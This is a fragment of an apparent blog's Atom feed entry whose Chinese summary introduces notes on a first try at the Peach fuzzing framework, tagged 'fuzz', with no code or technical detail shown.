&lt;/blockquote&gt;
&lt;p&gt;接下来就简单记录一下今天下午对peach框架的粗浅尝试。&lt;/p&gt;
&lt;h3 id=&quot;以下是工作文件夹和成果展示&quot;&gt;&lt;a href=&quot;#以下是工作文件夹和成果展示&quot; class=&quot;headerlink&quot; title=&quot;以下是工作文件夹和成果展示&quot;&gt;&lt;/a&gt;以下是工作文件夹和成果展示&lt;/h3&gt;</summary>
    
    
    
    <category term="fuzz" scheme="http://example.com/categories/fuzz/"/>
    
    
  </entry>
  
</feed>
